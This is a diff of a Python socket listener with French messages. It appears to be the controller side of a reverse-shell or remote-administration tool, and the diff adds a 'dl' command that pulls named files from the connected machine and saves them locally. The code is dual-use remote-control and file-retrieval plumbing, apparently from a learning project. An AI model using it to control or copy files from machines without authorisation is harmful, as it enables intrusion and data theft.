@@ -70,6 +70,8 @@ connection_socket, client_address = s.accept()
 
 print(f"Connexion établie avec {client_address}")
 
+dl_file_name = None
+
 while True:
     # ... infos
     infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
@@ -85,13 +87,29 @@ while True:
         + infos_data.decode()
         + " > "
     )
+    commande_split = commande.split(" ")
+
+    if len(commande_split) == 2 and commande_split[0] == "dl":
+        dl_file_name = commande_split[1]
 
     data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
 
     if not data_recues:
         break
 
-    print(data_recues.decode())
+    if dl_file_name:
+        if len(data_recues) == 1 and data_recues == b" ":
+            print("ERREUR: le fichier", dl_file_name, "n'existe pas")
+        else:
+            f = open(dl_file_name, "wb")
+            f.write(data_recues)
+            f.close()
+
+            print(f"fichier {dl_file_name} téléchargé !")
+
+        dl_file_name = None
+    else:
+        print(data_recues.decode())
 
 s.close()
 connection_socket.close()
